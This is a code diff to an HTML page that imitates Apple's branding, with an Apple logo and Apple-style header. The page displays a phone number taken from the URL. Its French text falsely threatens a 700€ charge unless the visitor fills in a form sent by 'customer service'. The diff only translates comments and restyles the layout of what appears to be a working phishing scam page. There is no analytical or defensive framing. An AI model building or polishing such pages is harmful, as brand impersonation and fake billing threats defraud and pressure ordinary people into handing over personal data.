@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Traitement</title>
   <style>
-    /* Style général */
+    /* General Styles */
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
       margin: 0;
@@ -13,7 +13,7 @@
       color: #f5f5f7;
     }
 
-    /* Header type Apple */
+    /* Header Styles */
     header {
       background-color: #1c1c1e;
       padding: 0 20px;
@@ -26,26 +26,25 @@
       z-index: 1000;
       height: 48px;
     }
-    header nav {
-      display: flex;
-      align-items: center;
-    }
-    header nav a {
-      color: #f5f5f7;
-      text-decoration: none;
-      margin: 0 15px;
-      font-size: 14px;
-      font-weight: 400;
-      transition: color 0.3s;
-    }
-    header nav a:hover {
-      color: #0071e3;
-    }
     header img {
       height: 20px;
     }
+    nav {
+      display: flex;
+      gap: 15px;
+    }
+    nav a {
+      color: #f5f5f7;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 400;
+      transition: color 0.3s ease;
+    }
+    nav a:hover {
+      color: #0071e3;
+    }
 
-    /* Contenu principal */
+    /* Main Content Styles */
     main {
       display: flex;
       flex-direction: column;
@@ -54,10 +53,14 @@
       padding: 20px;
       min-height: 80vh;
     }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
     .warning {
       font-size: 18px;
       color: #ffcc00;
-      margin: 20px 0;
+      margin-bottom: 20px;
       text-align: center;
     }
     .error-message {
@@ -66,53 +69,52 @@
       border-radius: 5px;
       padding: 15px;
       color: #ff3b30;
-      width: 90%;
       max-width: 400px;
       text-align: center;
+      font-size: 16px;
+      line-height: 1.6;
     }
 
-    /* Responsive pour téléphone */
+    /* Responsive Styles */
     @media (max-width: 768px) {
-      header nav a {
-        margin: 0 10px;
+      nav a {
         font-size: 12px;
+        gap: 10px;
       }
       header img {
         height: 18px;
-      }
-      main {
-        padding: 10px;
       }
       .warning {
         font-size: 16px;
       }
       .error-message {
-        padding: 10px;
         font-size: 14px;
       }
     }
 
     @media (max-width: 480px) {
-      header nav a {
-        margin: 0 5px;
+      nav a {
         font-size: 11px;
       }
       header img {
         height: 16px;
       }
+      h1 {
+        font-size: 20px;
+      }
       .warning {
         font-size: 14px;
       }
       .error-message {
-        padding: 8px;
         font-size: 12px;
+        padding: 10px;
       }
     }
   </style>
 </head>
 <body>
+  <!-- Header -->
   <header>
-    <!-- Logo Apple -->
     <a href="#">
       <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
     </a>
@@ -127,25 +129,28 @@
     </nav>
   </header>
 
+  <!-- Main Content -->
   <main>
     <h1>⚠️ Avertissement ⚠️</h1>
     <p class="warning">Numéro saisi : <span id="phone"></span></p>
     <div class="error-message">
-      <p>Régularisation de votre situation :
-
-Nous vous informons que ce numéro sera facturé 700€ en cas de non-complétion de l’opération demandée. Afin d’éviter cette facturation, nous vous invitons à remplir le formulaire envoyé par notre service client dans les plus brefs délais.
-
-Pour toute assistance, notre équipe reste à votre disposition.</p>
+      <p>Régularisation de votre situation :</p>
+      <p>
+        Ce numéro sera facturé <strong>700€</strong> en cas de non-complétion de l’opération demandée.
+        Afin d’éviter cette facturation, veuillez remplir le formulaire envoyé par notre service client dans les plus brefs délais.
+      </p>
+      <p>Pour toute assistance, notre équipe reste à votre disposition.</p>
     </div>
   </main>
 
+  <!-- JavaScript -->
   <script>
-    // Lire les paramètres de l'URL
+    // Retrieve query parameters from URL
     const params = new URLSearchParams(window.location.search);
-    const countryCode = params.get("countryCode"); // Lire le code du pays
-    const phoneNumber = params.get("phoneNumber"); // Lire le numéro saisi
+    const countryCode = params.get("countryCode");
+    const phoneNumber = params.get("phoneNumber");
 
-    // Afficher le numéro si les données sont disponibles
+    // Display the phone number if provided
     const phoneDisplay = document.getElementById("phone");
     if (countryCode && phoneNumber) {
       phoneDisplay.textContent = `${countryCode} ${phoneNumber}`;
